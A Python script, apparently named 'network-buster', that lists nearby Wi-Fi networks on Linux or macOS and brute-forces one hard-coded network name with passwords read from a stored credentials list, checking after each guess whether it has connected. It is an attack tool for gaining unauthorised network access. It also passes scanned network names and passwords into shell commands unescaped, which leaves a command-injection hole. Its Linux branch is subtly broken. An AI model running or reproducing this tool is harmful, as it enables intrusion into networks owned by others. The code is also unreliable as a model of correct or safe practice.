import subprocess
import platform
import re
import os

main_directory = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
passwords_file = os.path.join(main_directory, "known_credentials", "router")
with open(passwords_file, "r") as file:
    passwords = file.read().splitlines()

# Get a list of networks available to the device.
def get_networks(os_name):
    output = None
    if os_name == "Linux":
        list_networks_command = "nmcli device wifi list"
        output = subprocess.check_output(list_networks_command, shell=True, text=True)
    elif os_name == "Darwin":
        list_networks_command = "/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -s"
        output = subprocess.check_output(list_networks_command, shell=True, text=True)
        lines = output.split("\n")
        output = [re.split("  +", line)[1] for line in lines if len(re.split("  +", line)) > 2]
    else:
        print("Unsupported OS")
    return output

# Attempt to connect to a network using the given SSID, password, and operating system name.
def connect_to_network(ssid, password, os_name):
    if os_name == "Linux":
        connect_command = f"nmcli device wifi connect \"{ssid}\" password \"{password}\""
        subprocess.run(connect_command, shell=True)
    elif os_name == "Darwin":
        connect_command = f"networksetup -setairportnetwork en0 \"{ssid}\" {password}"
        subprocess.run(connect_command, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    else:
        print("Unsupported OS")

# Check if the device is connected to a network.
# Returns True if connected, otherwise False.
def is_connected(os_name):
    flag = False
    if os_name == "Linux":
        output = subprocess.check_output("nmcli device show wlan0", shell=True, text=True)
        flag = "GENERAL.STATE: connected" in output
    elif os_name == "Darwin":
        output = subprocess.check_output("networksetup -getairportnetwork en0", shell=True, text=True)
        flag = "Current Wi-Fi Network: " in output
    else:
        print("Unsupported OS")
    return flag

# Main function for network-buster.
# This function will attempt to connect to a network using a list of known passwords.
# If successful, it will return True, otherwise False.
def bust():
    os_name = platform.system()
    networks = get_networks(os_name)

    if len(networks) > 0:
        for network in networks:
            if network == "TCHPNRD13M":
                for password in passwords:
                    print(f"Attempting to join \"{network}\" using password \"{password}\"...")
                    connect_to_network(network, password, os_name)
                    if is_connected(os_name):
                        print(f"Connected to network {network} using \"{password}\".")
                        return True
                    else:
                        print(f"Could not connect to network {network} using \"{password}\".")
                    print("\n")
    else:
        print("No networks found.")

    return False
